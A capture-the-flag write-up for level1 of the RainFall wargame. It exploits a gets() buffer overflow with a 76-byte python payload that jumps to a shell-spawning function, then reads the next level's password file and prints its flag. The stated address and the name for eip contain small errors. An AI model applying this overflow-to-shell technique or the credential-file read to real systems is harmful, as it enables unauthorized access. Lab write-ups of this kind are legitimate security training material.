There is an executable file named level1. Once started, the program waits for the user's input and then quits.

Using gdb, we can see that the program has two functions (using the `info functions` command): a main() and a run() function. The run() function displays a string on the standard output before launching a shell. The main() function records the user's input in a buffer with the gets() function. Check the [source.c file](source.c) for more details.

We note that the run function is never called. However, it should be possible to call it anyway, by exploiting the security hole of the gets() function. Indeed this function is vulnerable to buffer overflow attacks since the size of the user input is never checked.

After several attempts, we find that the buffer overflows with 76 characters. Beyond that, we overwrite the return address of the function contained in the eip (Index Pointer) register. So let's try here to pass the address of the run() function (0x0804844, found in gdb with the command `info functions`). There is a little trick: the addressing must be done in the little endian convention, that is to say from the least significant byte to the most significant byte, because that is how most computers work nowadays.

```
level1@RainFall:~$ python -c "print 'a' * 76 + '\x44\x84\x04\x08'" > /tmp/overflow
level1@RainFall:~$ cat /tmp/overflow | ./level1 
Good... Wait what?
Segmentation fault (core dumped)
```

Ok, so first victory: we manage to go through the run() function. However, we leave the program before we can do our little business. We must find a way to keep the program open. To do this, we can add '-' after the cat, so the program will read on the standard input until it meets an EOF ('^D') character.

```
level1@RainFall:~$ cat /tmp/overflow - | ./level1 
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
We can now reach the next level with the command `su level2` and fill in the flag found as a password.